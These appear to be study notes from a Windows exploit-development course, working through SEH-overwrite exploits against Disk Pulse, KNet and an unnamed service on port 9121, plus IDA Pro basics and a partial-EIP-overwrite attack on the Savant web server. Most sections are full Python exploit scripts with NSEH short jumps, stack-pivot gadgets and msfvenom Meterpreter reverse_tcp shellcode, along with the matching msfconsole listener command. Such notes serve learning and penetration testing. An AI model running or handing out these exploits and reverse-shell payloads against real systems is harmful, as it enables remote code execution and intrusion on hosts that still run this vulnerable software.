	.for (r $t0 = 0x58; $t0 < 0x5F; r $t0 = $t0 + 0x01)
	{
		.for (r $t1 = 0x58; $t1 < 0x5F; r $t1 = $t1 + 0x01)
		{
			s-[1]b 10000000 10226000 $t0 $t1 c3
		}
	}
}
```

`u 1015a2f0 L3`

```
libspp!pcre_exec+0x16460:
1015a2f0 58              pop     eax
1015a2f1 5b              pop     ebx
1015a2f2 c3              ret
```

```python
try:
  server = sys.argv[1]
  port = 9121
  size = 1000

  inputBuffer = b"\x41" * 128
  inputBuffer+= pack("<L", (0x1015a2f0))  # (SEH) 0x1015a2f0 - pop eax; pop ebx; ret
  inputBuffer+= b"\x43" * (size - len(inputBuffer))
```

`!exchain`

```
018ffe1c: libpal!md5_starts+149fb (0099df5b)
018fff54: libspp!pcre_exec+16460 (1015a2f0)
Invalid exception stack at 41414141
```

`u 1015a2f0 L3`

```
libspp!pcre_exec+0x16460:
1015a2f0 58              pop     eax
1015a2f1 5b              pop     ebx
1015a2f2 c3              ret
```

`bp 0x1015a2f0`

```
t
t
```

`dd poi(esp) L8`

```
018fff54  41414141 1015a2f0 43434343 43434343
018fff64  43434343 43434343 43434343 43434343
```

`t`

After executing the `RET` instruction, we returned into the stack within our controlled buffer right before our `_except_handler` address.

This happens because the `EstablisherFrame` points to the beginning of the `_EXCEPTION_REGISTRATION_RECORD` structure, which starts with the `Next` member followed by the `_except_handler` address.

### Island-Hopping in Assembly

`u eip L8`

```
018fff54 41              inc     ecx
018fff55 41              inc     ecx
018fff56 41              inc     ecx
018fff57 41              inc     ecx
018fff58 f0a215104343    lock mov byte ptr ds:[43431015h],al
018fff5e 43              inc     ebx
018fff5f 43              inc     ebx
018fff60 43              inc     ebx
```

The bytes composing the P/P/R address are translated to a `lock mov byte` instruction when executed as code. This instruction uses part of our buffer as a destination address (`43431015h`) to write the content of the `AL` register.

Because this memory address is not mapped, executing this instruction will trigger another **access violation** and break our exploit.

We can overcome this by using the first 4 bytes of the `Next` structure exception handler (NSEH) to assemble an instruction that will jump over the current SEH and redirect us into our fake shellcode located after the `P/P/R` address. This is known as a "short jump" in assembly.

In assembly, **short jumps** aka **short relative jumps**.

These jump instructions can be relocated anywhere in memory without requiring a change of opcode.

The first opcode of a short jump is always `0xEB` and the second opcode is the **relative offset**, which ranges
- `0x00` - `0x7F` for forward short jumps,
- `0x80` - `0xFF` for backwards short jumps.

After single-stepping through the P/P/R instructions, use the `a` command to assemble the short jump and **obtain its opcodes**:

`dds eip L4`

```
018fff54  41414141
018fff58  1015a2f0 libspp!pcre_exec+0x16460
018fff5c  43434343
018fff60  43434343
```

`a`

```
018fff54 jmp 0x018fff5c
jmp 0x018fff5c
018fff56 
```

`u eip L1`

```
018fff54 eb06            jmp     018fff5c
```

The offset for the jump is 6 bytes rather than 4 (the length of the `P/P/R` address). This is because the offset is calculated from the beginning of the jump instruction, which includes the `0xEB` and the offset itself.

```python
try:
  server = sys.argv[1]
  port = 9121
  size = 1000

  inputBuffer = b"\x41" * 124
  inputBuffer+= pack("<L", (0x06eb9090))  # (NSEH)
  inputBuffer+= pack("<L", (0x1015a2f0))  # (SEH) 0x1015a2f0 - pop eax; pop ebx; ret
  inputBuffer+= b"\x43" * (size - len(inputBuffer))
```

Let the debugger continue until it hits our breakpoint `bp 0x1015a2f0`. Next, we'll single-step through the `POP, POP, RET` instructions and reach our short jump:

`r`

```
0132ff54 90              nop
```

`t`

```
0132ff55 90              nop
```

`t`

```
0132ff56 eb06            jmp     0132ff5e
```

`dd eip L30`

```
0132ff56  a2f006eb 43431015 43434343 43434343
0132ff66  43434343 43434343 43434343 43434343
0132ff76  43434343 43434343 43434343 43434343
0132ff86  43434343 43434343 43434343 43434343
0132ff96  43434343 43434343 43434343 43434343
0132ffa6  43434343 43434343 43434343 43434343
0132ffb6  43434343 43434343 43434343 43434343
0132ffc6  43434343 43434343 43434343 43434343
0132ffd6  43434343 ff004343 008d0132 ffff77ed
0132ffe6  6c77ffff 000077f1 00000000 3e100000
0132fff6  7170005b 000000a0 ???????? ????????
01330006  ???????? ???????? ???????? ????????
```

`!teb`

```
TEB at 7ffd8000
    ExceptionList:        0132f34c
    StackBase:            01330000
    StackLimit:           0132e000
```

This amount of space may fit a small shellcode, but we would certainly prefer reverse-shell shellcode in our exploit.

Our PoC sends a large amount of data (1000 bytes), so let's search the stack and see if we can find it.

```python
try:
  server = sys.argv[1]
  port = 9121
  size = 1000

  shellcode = b"\x43" * 400

  inputBuffer = b"\x41" * 124
  inputBuffer+= pack("<L", (0x06eb9090))  # (NSEH)
  inputBuffer+= pack("<L", (0x1015a2f0))  # (SEH) 0x1015a2f0 - pop eax; pop ebx; ret
  inputBuffer+= b"\x90" * (size - len(inputBuffer) - len(shellcode))
  inputBuffer+= shellcode
```

Let the debugger continue until it hits our breakpoint `bp 0x1015a2f0`. Next, we'll single-step through the `POP, POP, RET` instructions and reach our short jump:

Running our latest PoC, we can perform a search for the NOP instructions followed by the bytes contained in our shellcode variable right after taking our short jump.

`t`

```
01aeff56 eb06            jmp     01aeff5e
```

`t`

```
01aeff5e 90              nop
```

`!teb`

```
TEB at 00392000
    ExceptionList:        01aef44c
    StackBase:            01af0000
    StackLimit:           01aee000
```

`s -b 01aee000 01af0000 90 90 90 90 43 43 43 43 43 43 43 43`

```
01aefc70  90 90 90 90 43 43 43 43-43 43 43 43 43 43 43 43  ....CCCCCCCCCCCC
```

We found our shellcode on the stack starting from `0x01aefc74`.

Confirm that our shellcode is not truncated in any way.

=> Dumping the full length of the shellcode as DWORDs reveals our entire buffer:

`dd 01aefc70 L65`

```
01aefc70  90909090 43434343 43434343 43434343
01aefc80  43434343 43434343 43434343 43434343
...
01aefdf0  43434343 43434343 43434343 43434343
01aefe00  43434343
```

`? 01aefe00 - 01aefc74`

```
Evaluate expression: 396 = 0000018c
```

Determine the offset from our current stack pointer to the beginning of our shellcode

`? 01aefc74 - @esp`

```
Evaluate expression: 2096 = 00000830
```

To verify the consistency of the offset, we should restart the application and run our exploit multiple times. If possible, we should install the vulnerable application on different machines as well.

If the offset changes slightly each time we launch our exploit, we could introduce a **bigger NOP sled**, placing our shellcode further in our buffer.

Using the limited space available after our short jump, let's assemble a few instructions to increase the stack pointer by `0x830` bytes followed by a `jmp esp` to jump to our shellcode next.

Cannot use an `add esp, 0x830` instruction because it generates null bytes in the opcodes due to the large value:

```bash
msf-nasm_shell 
nasm > add esp, 0x830
00000000  81C430080000      add esp,0x830
```

To avoid null bytes, we could use smaller jumps (of less than `0x7F`) until we reach the desired offset.

Better alternatives: Instead of performing an `ADD` operation on the ESP register, we can reference the `SP` register in our assembly instruction to do arithmetic operations on the lower 16 bits.

Generate the opcodes for this instruction and confirm it does not contain any bad characters.

```bash
nasm > add sp, 0x830
00000000  6681C43008        add sp,0x830

nasm > jmp esp
00000000  FFE4              
```

```python
try:
  server = sys.argv[1]
  port = 9121
  size = 1000

  shellcode = b"\x90" * 8
  shellcode+= b"\x43" * (400 - len(shellcode))

  inputBuffer = b"\x41" * 124
  inputBuffer+= pack("<L", (0x06eb9090))  # (NSEH)
  inputBuffer+= pack("<L", (0x1015a2f0))  # (SEH) 0x1015a2f0 - pop eax; pop ebx; ret
  inputBuffer+= b"\x90" * 2
  inputBuffer+= b"\x66\x81\xc4\x30\x08"   # add sp, 0x830
  inputBuffer+= b"\xff\xe4"               # jmp esp
  inputBuffer+= b"\x90" * (size - len(inputBuffer) - len(shellcode))
  inputBuffer+= shellcode
```

`t`

```
01caff5e 6681c43008      add     sp,830h
```

`t`

```
01caff63 ffe4            jmp     esp {01cafc74}
```

`dd @esp L4`

```
01cafc74  90909090 90909090 43434343 43434343
```

`t`

```
01cafc74 90              nop
```

### Obtaining a Shell

Generate a Meterpreter payload (~ 381 bytes)

```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.118.5 LPORT=443 -b "\x00\x02\x0A\x0D\xF8\xFD" -f python -v shellcode
```

Metasploit handler was able to catch our reverse meterpreter payload.

```bash
msfconsole -q -x "use exploit/multi/handler; set PAYLOAD windows/meterpreter/reverse_tcp; set LHOST 192.168.119.5; set LPORT 443; exploit"
```

```python
#!/usr/bin/python
import socket
import sys
from struct import pack

try:
  server = sys.argv[1]
  port = 9121
  size = 1000

  # msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.118.5 LPORT=443 -b "\x00\x02\x0A\x0D\xF8\xFD" -f python -v shellcode
  shellcode = b"\x90" * 20
  shellcode += b""
  shellcode += b"\xdb\xdd\xb8\xb3\xe9\xc8\x0b\xd9\x74\x24\xf4"
  ...
  shellcode += b"\xb3\x44\x07\x9c\x96"

  inputBuffer = b"\x41" * 124
  inputBuffer+= pack("<L", (0x06eb9090))  # (NSEH)
  inputBuffer+= pack("<L", (0x1015a2f0))  # (SEH) 0x1015a2f0 - pop eax; pop ebx; ret
  inputBuffer+= b"\x90" * 2
  inputBuffer+= b"\x66\x81\xc4\x30\x08"   # add sp, 0x830
  inputBuffer+= b"\xff\xe4"               # jmp esp
  inputBuffer+= b"\x90" * (size - len(inputBuffer) - len(shellcode))
  inputBuffer+= shellcode

  header =  b"\x75\x19\xba\xab"
  header += b"\x03\x00\x00\x00"
  header += b"\x00\x40\x00\x00"
  header += pack('<I', len(inputBuffer))
  header += pack('<I', len(inputBuffer))
  header += pack('<I', inputBuffer[-1])

  buf = header + inputBuffer 

  print("Sending evil buffer...")
  s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
  s.connect((server, port))
  s.send(buf)
  s.close()
  
  print("Done!")
  
except socket.error:
  print("Could not connect!")
```

## Extra Mile

### Disk Pulse

`s -b 0 L?80000000 90 90 90 90 44 44 44 44 44 44 44 44`

`dd 01aefc70 L65`

```python
##!/usr/bin/python
import socket, sys
from struct import pack

host = sys.argv[1]
port = 80
size = 6000


def send_exploit_request():


    found_badchars = "\x00\x09\x0a\x0d\x20"

    # msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.118.5 LPORT=443 -b "\x00\x09\x0a\x0d\x20" -f python -v shellcode
    shellcode =  b""
    shellcode += b"\xba\xf4\xfa\x3e\x25\xdb\xd0\xd9\x74\x24\xf4"
    ....
    shellcode += b"\x64\x51\x02\x52\x3a\xa1\x07"

    buffer = b"\x90" * 20
    buffer+= shellcode
    buffer+= b"\x41" * (2495 - len(buffer))
    
    buffer+= pack("<L", (0x909006eb))  # (NSEH)
    buffer+= pack("<L", (0x101576c0))  # (SEH) 0x101576c0 - pop eax; pop ebx; ret
    buffer+= b"\x90" * 2
    buffer+= b"\x66\x81\xc4\x8c\x05"  # add sp,0x58C
    buffer+= b"\xff\xe4"
    buffer+= b"\x43" * (size - len(buffer))

    #HTTP Request
    request = b"GET /" + buffer + b"HTTP/1.1" + b"\r\n"
    request += b"Host: " + host.encode() + b"\r\n"
    request += b"User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:31.0) Gecko/20100101 Firefox/31.0 Iceweasel/31.8.0" + b"\r\n"
    request += b"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8" + b"\r\n"
    request += b"Accept-Language: en-US,en;q=0.5" + b"\r\n"
    request += b"Accept-Encoding: gzip, deflate" + b"\r\n"
    request += b"Connection: keep-alive" + b"\r\n\r\n"
 
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((host,port))
    s.send(request)
    s.close()

if __name__ == "__main__": 

    send_exploit_request()
```

### KNet

```python
#!/usr/bin/python
import socket, sys
from struct import pack

host = sys.argv[1]
port = 80
size = 2000


def send_exploit_request():

    # msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.45.237 LPORT=443 -b "\x00\x0d\x20\x2d\x2e\x2f" -f python -v shellcode
    shellcode =  b""
    shellcode += b"\xd9\xc0\xb8\x39\x86\x35\xad\xd9\x74\x24\xf4"
    ...
    shellcode += b"\xe7\x48\x85\x84\xbb\x8b\x8c"

    buffer = b"\x90" * 20
    buffer+= shellcode
    buffer+= b"\x41" * (1236 - len(buffer))

    # msf-pattern_offset -l 2000 -q 70423370
    buffer+= pack("<L", (0x04eb9090))  # (NSEH)
    buffer+= pack("<L", (0x10016190))  # (SEH) 0x10016190 - pop ebx; pop ebp; ret
    buffer+= b"\x90" * 2
    buffer+= b"\x66\x81\xc4\xfc\x06"  # add sp, 0x6fc 6681C4FC06
    buffer+= b"\xff\xe4"
    buffer+= b"\x43" * (size - len(buffer))

    found_badchars = "\x00\x0d\x20\x2d\x2e\x2f"

    #HTTP Request
    request  = buffer + b" / HTTP/1.0\r\n\r\n"
 
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((host,port))
    s.send(request)
    print(s.recv(1024))
    s.close()

if __name__ == "__main__": 

    send_exploit_request()
```

# IDA Pro

For 32-bit Windows executables and Dynamic Link Libraries (DLLs), select the `Portable executable for 80386`. This is a common denominator for all 32bit x86 processors.

Like WinDbg, IDA Pro can download and use symbols from the Microsoft server while disassembling the binary. This is only natively available if IDA Pro is installed on Windows.

For versions other than IDA Freeware, it's possible to set up a symbols server on a Windows computer with a bundled `Win32_debugger` application.

Options to save IDA Pro database:
- `Pack database`: A file needs to be packed properly to be successfully saved to an `idb` database file, if we don't want to lose our changes.
- `DON'T SAVE the database`: If we do not want to save our changes.

## User Interface

The main disassembly window can show the code organized in three 3 different ways:
-	Graph view
-	Text view
-	Proximity view

The **green and red arrows** originating from a **conditional branch** indicate if the condition was met or not respectively - like if and else in low level languages like C or C++.

**Blue arrows** represent basic block edges, where only one potential successor block is present (`JMP` assembly instruction).

Reposition the graph while analyzing a selected function by clicking and dragging the background of the `graph` view.

The `text` view presents the entire disassembly listing of a program in a linear fashion. **Control flow** is still indicated by **arrows to the left of the listing**.

Switch between graph view and text view by pressing `Space`.

In the `text` view, **virtual addresses** are displayed for each instruction.

=> Add this for the `graph` view by going to `Options > General` and ticking the `Line prefixes` box.
 
`Proximity` view is for viewing and browsing the relationships between functions, global variables, and constants.

Activate proximity view through `View > Open subviews > Proximity browser`.

The `Functions` window provides a list of all the functions present in the program.
 
Double-clicking an entry in the Functions window will cause IDA Pro to show the start of the selected function directly in the `disassembly` window.

To easily navigate the disassembly of large functions, use the `Graph overview` window to rapidly pan around the function graph.

A dotted outline in the Graph overview indicates which part of the code is currently displayed in the disassembly window.

Navigate to previously viewed basic blocks using the `forward and backward arrows` in the navigation bar at the top left part of the IDA Pro window.
 
To adjust a single window, place the cursor just below the title of the window. When a small bar appears, drag and dock the window next to other windows.
 
Completely reset the UI using `Windows > Reset desktop`.

## Basic Functionality

`Coloring dialog box` - a combination of 2 **colors** can help show desired and undesired paths through basic blocks.

**Comment** on a specific line of assembly code by placing the cursor at a specific line of code and pressing the colon (`:`) key

**Rename a function** by locating it in the `Functions` window, right-clicking it, and selecting `Edit function....` or by pressing the `N` key when the function name is open in the main **assembly window**. This also applies to **global variables**.

Create a **bookmark** by choosing the line we want to bookmark and pressing `Alt + M`

Whenever we need to come back to the same location in the code, pressing `Ctrl + M` will bring up a dialog to select a bookmark. Double-clicking the bookmark name will jump the main disassembly window to the code in question.

## Search Functionality

Search for sequences of bytes, strings, and function names in a target executable or dynamic link library

Search for an **immediate value**, such as a hardcoded DWORD or a specific sequence of bytes, from the `Search` menu or by using `Alt + I` and `Alt + B`, respectively.

Search for **function names** in the `Functions` window or through the `Jump to function` command from the `Jump` menu. In the dialog window, right-click and use `Quick filter` to search for functions

Search for **global variables** through the Jump by name... submenu

All the imported and exported functions are available from the `Imports` and `Exports` tabs respectively. As with the Function window, we can right-click and apply a name filter using the `Quick filter` option to narrow our search.

Use cross referencing (`xref`) to detect all **usages of a specific function or global variable** in the entire executable or DLL.

To obtain the list of cross references for a function name or global variable, select its name from the `graph` view with the mouse cursor and press the `X` key.

## Static-Dynamic Analysis Synchronization

To make sure that the base address of the target executable in IDA Pro coincides with that of the debugged process in WinDbg.

When a Windows executable or DLL file is compiled and linked, the PE header `ImageBase` field defines the preferred base address when loaded into memory.

Often this will not be the address used at runtime, due to other circumstances such as colliding modules or the Address Space Layout Randomization (ASLR) security mitigation.

When the two base addresses do not coincide, the analyzed file can be rebased in IDA Pro to match the address used by the application at runtime.

Dump the base address of Notepad:

`lm m notepad`

```
Browse full module list
start    end        module name
00f20000 00f5f000   notepad    (pdb symbols)  ...
```

Switch back to IDA Pro and navigate to the `Edit > Segments`, enter the new `image base` address.

Once completed, all addresses, references, and global variables will match those found in WinDbg during the debugging session.

If the application contains compiled debug information, rebasing it may sometimes break the symbols.

`u notepad!GotoDlgProc`

```
notepad!GotoDlgProc:
00f279e0 8bff            mov     edi,edi
00f279e2 55              push    ebp
00f279e3 8bec            mov     ebp,esp
```

Press `G` to bring up the `Jump to address` dialog box and enter the absolute address of the function to end up at the same location.

## Tracing Notepad

```bat
echo Test > C:\Tools\doc.txt
```

Open Notepad and attach WinDbg to it.

To perform any read or write actions on Windows, applications must obtain a **handle** to the file, commonly done with the `CreateFileW` function from `kernel32.dll`.

Set a breakpoint on the API and attempt to open the file in Notepad:

```
bp kernel32!CreateFileW
g
```

Turn to IDA Pro, locate `CreateFileW` in the `Imports` tab, and perform a **cross reference**. This provides us with 20 different possibilities.

Let execution continue in the debugger until the end of `CreateFileW`, and return into the calling function:

```
pt
p
```

```
00f25085 8bd8            mov     ebx,eax
```

EAX also contains the handle to the file we'll use later (`eax=00000640`)

We now have an address inside Notepad that we can use with IDA Pro.

After jumping to the address, we find a basic block that sets up arguments and calls `CreateFileW`.

=> Understand what arguments are supplied to the API, since IDA Pro lists their names as comments

Follow the execution flow in IDA Pro and attempt to locate a call to `ReadFile` (within the same function that performed a call to `CreateFileW`).

The instruction `push eax` at address `0xF250A4` is noted by IDA Pro as `lpBuffer`. This is a pointer to the memory buffer that receives the data read from a file.

Continue execution to the call into `ReadFile`:

```
bp f250a6
g
dds esp L5
```

```
007febf8  00000640
007febfc  007fec28
007fec00  00000400
007fec04  007fec20
007fec08  00000000
```

The first argument, is the same file handle returned by `CreateFileW` earlier.

Step over the call to `ReadFile`:

`p`

`da 007fec28`

```
007fec28  "Test ..w."
```

# Overcoming Space Restrictions: Egghunters

## Crashing the Savant Web Server

```python
#!/usr/bin/python
import socket
import sys
from struct import pack

try:
  server = sys.argv[1]
  port = 80
  size = 260

  httpMethod = b"GET /"
  inputBuffer = b"\x41" * size
  httpEndRequest = b"\r\n\r\n"

  buf = httpMethod + inputBuffer +  httpEndRequest

  print("Sending evil buffer...")
  s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
  s.connect((server, port))
  s.send(buf)
  s.close()
  
  print("Done!")
  
except socket.error:
  print("Could not connect!")
```

`dds @esp L5`

```
01b8ea2c  00414141 Savant+0x14141
01b8ea30  01b8ea84
01b8ea34  0041703c Savant+0x1703c
01b8ea38  01805718
01b8ea3c  01805718
```

- We only have 3 bytes available for our shellcode.
- Our buffer is null-byte terminated.

Increasing the size of the buffer by even 1 byte will cause a different crash where we do not gain control over the instruction pointer!

`dds @esp L2`

```
01b8ea2c  00414141 Savant+0x14141
01b8ea30  01b8ea84
```

`dc poi(esp+4)`

```
01b8ea84  00544547 00000000 00000000 00000000  GET.............
01b8ea94  00000000 00000000 4141412f 41414141  ......../AAAAAAA
01b8eaa4  41414141 41414141 41414141 41414141  AAAAAAAAAAAAAAAA
01b8eab4  41414141 41414141 41414141 41414141  AAAAAAAAAAAAAAAA
01b8eac4  41414141 41414141 41414141 41414141  AAAAAAAAAAAAAAAA
```

The 2nd DWORD on the stack points to the **HTTP method**, followed by several null bytes and then our controlled buffer.

## Detecting Bad Characters

```python
...
try:
  server = sys.argv[1]
  port = 80
  size = 260

  badchars = (
    b"\x00\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c"
    b"\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19"
    b"\x1a\x1b\x1c\x1d\x1e\x1f\x20\x21\x22\x23\x24\x25\x26"
    b"\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33"
    b"\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40"
    b"\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d"
    b"\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a"
    b"\x5b\x5c\x5d\x5e\x5f\x60\x61\x62\x63\x64\x65\x66\x67"
    b"\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74"
    b"\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80\x81"
    b"\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e"
    b"\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b"
    b"\x9c\x9d\x9e\x9f\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8"
    b"\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5"
    b"\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0\xc1\xc2"
    b"\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf"
    b"\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc"
    b"\xdd\xde\xdf\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9"
    b"\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6"
    b"\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff")

  httpMethod = b"GET /"
  inputBuffer = badchars
  inputBuffer+= b"\x41" * (size - len(inputBuffer))
  httpEndRequest = b"\r\n\r\n"
...
```

Running the PoC against the vulnerable software does not seem to cause a crash. This is most likely the result of a bad character. 

Comment out the first half of the lines from the badchars variable.

```python
...
try:
  server = sys.argv[1]
  port = 80
  size = 260

  badchars = (
    #b"\x00\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c"
    #b"\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19"
    #b"\x1a\x1b\x1c\x1d\x1e\x1f\x20\x21\x22\x23\x24\x25\x26"
    #b"\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33"
    #b"\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40"
    #b"\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d"
    #b"\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a"
    #b"\x5b\x5c\x5d\x5e\x5f\x60\x61\x62\x63\x64\x65\x66\x67"
    #b"\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74"
    #b"\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80\x81"
    b"\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e"
    b"\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b"
    b"\x9c\x9d\x9e\x9f\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8"
    b"\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5"
    b"\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0\xc1\xc2"
    b"\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf"
    b"\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc"
    b"\xdd\xde\xdf\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9"
    b"\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6"
    b"\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff"
    )

  httpMethod = b"GET /"
  inputBuffer = badchars
  inputBuffer+= b"\x41" * (size - len(inputBuffer))
  httpEndRequest = b"\r\n\r\n"
...
```

Successfully overwrite the instruction pointer.

=> The problematic characters are not present within the last half of the badchars variable, which is not commented out.

Confirm that none of our characters have been mangled in memory:

`db esp - 0n257`

Repeat this process by uncommenting one line at the time.

If the application does not crash, or if we encounter a different crash which does not overwrite the instruction pointer, we can safely assume that the previously uncommented line contains bad characters.

Once we identify the problematic line of characters, send each character from that line individually to the application until we identify the bad characters.

The list of all bad characters: `0x00, 0x0A, 0x0D, 0x25`

## Gaining Code Execution

```bash
msf-pattern_create -l 260
```

```python
...
try:
  server = sys.argv[1]
  port = 80

  httpMethod = b"GET /"
  inputBuffer = b"Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai"
  httpEndRequest = b"\r\n\r\n"
...
```

Running the PoC above sometimes causes a different access violation.

=> Identify the offset by splitting our buffer.

```python
...
try:
  server = sys.argv[1]
  port = 80

  httpMethod = b"GET /"
  inputBuffer = b"\x41" * 130
  inputBuffer+= b"\x42" * 130
  httpEndRequest = b"\r\n\r\n"
...
```

The instruction pointer was overwritten with the `0x42424242` value.

Further split the upper half of our buffer until we are able to accurately pinpoint the exact offset required to overwrite the instruction pointer with our 260-byte buffer.

=> A buffer of `253` bytes required prior to overwriting the instruction pointer.

```python
...
try:
  server = sys.argv[1]
  port = 80
  size = 260

  httpMethod = b"GET /"
  inputBuffer = b"\x41" * 253
  inputBuffer+= b"\x42\x42\x42\x42"
  inputBuffer+= b"\x43" * (size - len(inputBuffer))
  httpEndRequest = b"\r\n\r\n"
...
```

Find a good instruction to overwrite EIP with that will allow us to take control of the execution flow.

To make our exploit as portable as possible, choose a module that comes with the application. The module should not be compiled with any protections.

List the protections of the loaded modules.

`.load narly`

`!nmod`

```
00400000 00452000 Savant    /SafeSEH OFF    C:\Savant\Savant.exe
```

The `Savant.exe` module, compiled without any protections, seems to be mapped at an address that starts with a **null byte**.

## Partial EIP Overwrite

Recall that our buffer is treated as a string => A null byte is added at the end of it.

Only overwrite the lower 3 bytes of the EIP register

```python
...
try:
  server = sys.argv[1]
  port = 80
  size = 253

  httpMethod = b"GET /"
  inputBuffer = b"\x41" * size
  inputBuffer+= b"\x42\x42\x42"
  httpEndRequest = b"\r\n\r\n"

  buf = httpMethod + inputBuffer +  httpEndRequest
...
```

Our partial EIP overwrite was successful (`eip=00424242`).

=> Use an instruction that is present inside the `Savant.exe` module.

What instruction we want to redirect the execution flow to?

One side-effect of our partial instruction pointer overwrite is that we cannot store any data past the return address.

=> Cannot use an instruction like `JMP ESP` because the ESP register will not point to our buffer.

The 2nd DWORD on the stack at the time of the crash points very close to our current stack pointer.

`dds @esp L5`

```
02efea2c  02effe70
02efea30  02efea84
02efea34  0041703c Savant+0x1703c
02efea38  003d56d0
02efea3c  003d56d0
```

`dc poi(@esp+0x04)`

```
02efea84  00544547 00000000 00000000 00000000  GET.............
02efea94  00000000 00000000 4141412f 41414141  ......../AAAAAAA
02efeaa4  41414141 41414141 41414141 41414141  AAAAAAAAAAAAAAAA
02efeab4  41414141 41414141 41414141 41414141  AAAAAAAAAAAAAAAA
02efeac4  41414141 41414141 41414141 41414141  AAAAAAAAAAAAAAAA
02efead4  41414141 41414141 41414141 41414141  AAAAAAAAAAAAAAAA
02efeae4  41414141 41414141 41414141 41414141  AAAAAAAAAAAAAAAA
02efeaf4  41414141 41414141 41414141 41414141  AAAAAAAAAAAAAAAA
```

=> `POP R32; RET`

=> We will have to execute the assembly instructions generated by the GET method opcodes.

`u poi(@esp+0x04)`

```
02efea84 47              inc     edi
02efea85 45              inc     ebp
02efea86 54              push    esp
02efea87 0000            add     byte ptr [eax],al
02efea89 0000            add     byte ptr [eax],al
02efea8b 0000            add     byte ptr [eax],al
02efea8d 0000            add     byte ptr [eax],al
02efea8f 0000            add     byte ptr [eax],al
```

The first three instructions do not seem to affect the execution flow or generate any access violations.

The next instructions, generated by the null bytes after the HTTP method, use the `ADD` operation - the value of the `AL` register is added to the value that `EAX` is pointing to.

These types of instructions can be problematic as they operate on the assumption that `EAX` points to a valid memory address.

=> As part of the `POP` instruction from our sequence, place the DWORD that `ESP` points to into the register of our choice.

Inspect the value that will be popped by the first instruction.

`dds @esp L5`

```
02efea2c  02effe70
02efea30  02efea84
02efea34  0041703c Savant+0x1703c
02efea38  003d56d0
02efea3c  003d56d0
```

`!teb`

```
TEB at 7ffdc000
    ExceptionList:        02efff70
    StackBase:            02f00000
    StackLimit:           02efc000
    SubSystemTib:         00000000
    ...
```

The 1st DWORD on the stack (`02effe70`) points to a memory location that is part of the stack space => a valid memory address.


```bash
msf-nasm_shell
nasm > pop eax
00000000  58                pop eax
nasm > ret
00000000  C3                ret
```

`lm m Savant`

```
Browse full module list
start    end        module name
00400000 00452000   Savant   C (no symbols)
```

`s -[1]b 00400000 00452000 58 c3`

Choose a memory address that points to our instruction sequence and does not contain bad characters `0x00418674`.

```python
...
try:
  server = sys.argv[1]
  port = 80
  size = 253

  httpMethod = b"GET /"
